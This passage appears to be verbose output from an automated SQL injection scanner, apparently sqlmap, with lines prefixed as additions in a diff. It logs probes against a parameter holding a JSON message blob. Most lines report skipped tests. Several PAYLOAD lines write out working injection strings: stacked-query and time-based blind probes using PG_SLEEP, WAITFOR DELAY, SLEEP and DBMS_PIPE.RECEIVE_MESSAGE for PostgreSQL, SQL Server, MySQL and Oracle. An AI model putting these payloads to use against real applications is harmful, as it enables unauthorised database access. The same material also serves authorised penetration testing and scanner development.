+[16:23:51] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Parameter replace (integer column)' because the level (4) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Oracle error-based - Parameter replace' because the level (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Firebird error-based - Parameter replace' because the level (4) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'IBM DB2 error-based - Parameter replace' because the level (4) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)' because the level (5) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)' because the level (5) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)' because the level (5) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)' because the level (5) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)' because the level (4) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)' because the level (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)' because the level (5) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)' because the level (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'PostgreSQL error-based - ORDER BY, GROUP BY clause' because the level (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)' because the level (5) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - ORDER BY clause' because the level (4) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Oracle error-based - ORDER BY, GROUP BY clause' because the level (4) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Firebird error-based - ORDER BY clause' because the level (5) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'IBM DB2 error-based - ORDER BY clause' because the level (5) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Stacking (EXEC)' because the level (2) is higher than the provided (1)
+
+[16:23:51] [INFO] testing 'Generic inline queries'
+
+[16:23:51] [PAYLOAD] (SELECT CONCAT(CONCAT('qxvxq',(CASE WHEN (2682=2682) THEN '1' ELSE '0' END)),'qpvpq'))
+
+[16:23:52] [DEBUG] skipping test 'MySQL inline queries' because the level (2) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'PostgreSQL inline queries' because the level (2) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'Microsoft SQL Server/Sybase inline queries' because the level (2) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'Oracle inline queries' because the level (2) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'SQLite inline queries' because the level (3) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'Firebird inline queries' because the level (3) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'ClickHouse inline queries' because the level (3) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (comment)' because the level (2) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries' because the level (3) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)' because the level (3) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (query SLEEP)' because the level (4) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'MySQL < 5.0.12 stacked queries (BENCHMARK)' because the risk (2) is higher than the provided (1)
+
+[16:23:52] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+
+[16:23:52] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]);SELECT PG_SLEEP(5)--
+
+[16:23:52] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}];SELECT PG_SLEEP(5)--
+
+[16:23:52] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]');SELECT PG_SLEEP(5)--
+
+[16:23:52] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]';SELECT PG_SLEEP(5)--
+
+[16:23:52] [DEBUG] skipping test 'PostgreSQL > 8.1 stacked queries' because the level (4) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'PostgreSQL stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'PostgreSQL stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'PostgreSQL < 8.2 stacked queries (Glibc - comment)' because the level (3) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'PostgreSQL < 8.2 stacked queries (Glibc)' because the level (5) is higher than the provided (1)
+
+[16:23:52] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+
+[16:23:52] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]);WAITFOR DELAY '0:0:5'--
+
+[16:23:52] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}];WAITFOR DELAY '0:0:5'--
+
+[16:23:52] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]');WAITFOR DELAY '0:0:5'--
+
+[16:23:52] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]';WAITFOR DELAY '0:0:5'--
+
+[16:23:52] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)' because the level (2) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries' because the level (4) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (DECLARE)' because the level (5) is higher than the provided (1)
+
+[16:23:52] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+
+[16:23:52] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]);SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(69)||CHR(78)||CHR(67),5) FROM DUAL--
+
+[16:23:52] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}];SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(69)||CHR(78)||CHR(67),5) FROM DUAL--
+
+[16:23:52] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(69)||CHR(78)||CHR(67),5) FROM DUAL--
+
+[16:23:52] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(69)||CHR(78)||CHR(67),5) FROM DUAL--
+
+[16:23:52] [DEBUG] skipping test 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)' because the level (4) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'Oracle stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'Oracle stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'Oracle stacked queries (DBMS_LOCK.SLEEP - comment)' because the level (4) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'Oracle stacked queries (DBMS_LOCK.SLEEP)' because the level (5) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'Oracle stacked queries (USER_LOCK.SLEEP - comment)' because the level (5) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'Oracle stacked queries (USER_LOCK.SLEEP)' because the level (5) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'IBM DB2 stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'IBM DB2 stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'SQLite > 2.0 stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'SQLite > 2.0 stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'Firebird stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'Firebird stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'SAP MaxDB stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'SAP MaxDB stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'HSQLDB >= 1.7.2 stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'HSQLDB >= 1.7.2 stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'HSQLDB >= 2.0 stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'HSQLDB >= 2.0 stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:52] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+
+[16:23:52] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]) AND (SELECT 2982 FROM (SELECT(SLEEP(5)))LEmK) AND (4345=4345
+
+[16:23:52] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}] AND (SELECT 2982 FROM (SELECT(SLEEP(5)))LEmK)
+
+[16:23:52] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]') AND (SELECT 2982 FROM (SELECT(SLEEP(5)))LEmK) AND ('nfmB'='nfmB
+
+[16:23:52] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]' AND (SELECT 2982 FROM (SELECT(SLEEP(5)))LEmK) AND 'tCie'='tCie
+
+[16:23:52] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}] AND (SELECT 2982 FROM (SELECT(SLEEP(5)))LEmK)-- blXP
+
+[16:23:52] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)' because the risk (3) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (SLEEP)' because the level (2) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (SLEEP)' because the risk (3) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)' because the level (3) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)' because the level (3) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)' because the risk (2) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'MySQL > 5.0.12 AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)' because the risk (3) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'MySQL > 5.0.12 OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind' because the level (2) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (comment)' because the level (4) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)' because the level (3) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)' because the level (4) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'MySQL AND time-based blind (ELT)' because the level (3) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'MySQL OR time-based blind (ELT)' because the risk (3) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'MySQL AND time-based blind (ELT - comment)' because the level (5) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'MySQL OR time-based blind (ELT - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:52] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+
+[16:23:52] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]) AND 3793=(SELECT 3793 FROM PG_SLEEP(5)) AND (9434=9434
+
+[16:23:52] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}] AND 3793=(SELECT 3793 FROM PG_SLEEP(5))
+
+[16:23:52] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]') AND 3793=(SELECT 3793 FROM PG_SLEEP(5)) AND ('kWki'='kWki
+
+[16:23:52] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]' AND 3793=(SELECT 3793 FROM PG_SLEEP(5)) AND 'Tzbm'='Tzbm
+
+[16:23:52] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}] AND 3793=(SELECT 3793 FROM PG_SLEEP(5))-- kNWa
+
+[16:23:52] [DEBUG] skipping test 'PostgreSQL > 8.1 OR time-based blind' because the risk (3) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'PostgreSQL > 8.1 AND time-based blind (comment)' because the level (4) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'PostgreSQL > 8.1 OR time-based blind (comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'PostgreSQL AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'PostgreSQL OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'PostgreSQL AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:52] [DEBUG] skipping test 'PostgreSQL OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:52] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+
+[16:23:52] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]) WAITFOR DELAY '0:0:5' AND (6555=6555
+
+[16:23:52] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}] WAITFOR DELAY '0:0:5'
+
+[16:23:53] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]') WAITFOR DELAY '0:0:5' AND ('fDQC'='fDQC
+
+[16:23:53] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]' WAITFOR DELAY '0:0:5' AND 'Fwhn'='Fwhn
+
+[16:23:53] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}] WAITFOR DELAY '0:0:5'-- dkwe
+
+[16:23:53] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind (IF - comment)' because the level (4) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:53] [INFO] testing 'Oracle AND time-based blind'
+
+[16:23:53] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]) AND 6790=DBMS_PIPE.RECEIVE_MESSAGE(CHR(79)||CHR(108)||CHR(116)||CHR(65),5) AND (4021=4021
+
+[16:23:53] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}] AND 6790=DBMS_PIPE.RECEIVE_MESSAGE(CHR(79)||CHR(108)||CHR(116)||CHR(65),5)
+
+[16:23:53] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]') AND 6790=DBMS_PIPE.RECEIVE_MESSAGE(CHR(79)||CHR(108)||CHR(116)||CHR(65),5) AND ('xfaS'='xfaS
+
+[16:23:53] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]' AND 6790=DBMS_PIPE.RECEIVE_MESSAGE(CHR(79)||CHR(108)||CHR(116)||CHR(65),5) AND 'RMJC'='RMJC
+
+[16:23:53] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}] AND 6790=DBMS_PIPE.RECEIVE_MESSAGE(CHR(79)||CHR(108)||CHR(116)||CHR(65),5)-- ibQP
+
+[16:23:53] [DEBUG] skipping test 'Oracle OR time-based blind' because the risk (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Oracle AND time-based blind (comment)' because the level (4) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Oracle OR time-based blind (comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Oracle AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Oracle OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Oracle AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Oracle OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'IBM DB2 AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'IBM DB2 OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'IBM DB2 AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'IBM DB2 OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'SQLite > 2.0 AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'SQLite > 2.0 OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'SQLite > 2.0 AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'SQLite > 2.0 OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Firebird >= 2.0 AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Firebird >= 2.0 OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Firebird >= 2.0 AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Firebird >= 2.0 OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'SAP MaxDB AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'SAP MaxDB OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'SAP MaxDB AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'SAP MaxDB OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'HSQLDB >= 1.7.2 AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'HSQLDB >= 1.7.2 OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'HSQLDB >= 1.7.2 AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'HSQLDB >= 1.7.2 OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'HSQLDB > 2.0 AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'HSQLDB > 2.0 OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'HSQLDB > 2.0 AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'HSQLDB > 2.0 OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Informix AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Informix OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Informix AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Informix OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'ClickHouse AND time-based blind (heavy query)' because the level (4) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'ClickHouse OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - Parameter replace' because the level (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)' because the level (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'MySQL < 5.0.12 time-based blind - Parameter replace (BENCHMARK)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'MySQL > 5.0.12 time-based blind - Parameter replace (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (bool)' because the level (4) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (ELT)' because the level (5) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (MAKE_SET)' because the level (5) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'PostgreSQL > 8.1 time-based blind - Parameter replace' because the level (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'PostgreSQL time-based blind - Parameter replace (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind - Parameter replace (heavy queries)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)' because the level (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)' because the level (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (heavy queries)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'SQLite > 2.0 time-based blind - Parameter replace (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Firebird time-based blind - Parameter replace (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'SAP MaxDB time-based blind - Parameter replace (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'IBM DB2 time-based blind - Parameter replace (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'HSQLDB >= 1.7.2 time-based blind - Parameter replace (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'HSQLDB > 2.0 time-based blind - Parameter replace (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'Informix time-based blind - Parameter replace (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause' because the level (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (BENCHMARK)' because the risk (2) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause' because the level (3) is higher than the provided (1)
+
+[16:23:53] [DEBUG] skipping test 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)' because the risk (2) is higher than the provided (1)
+
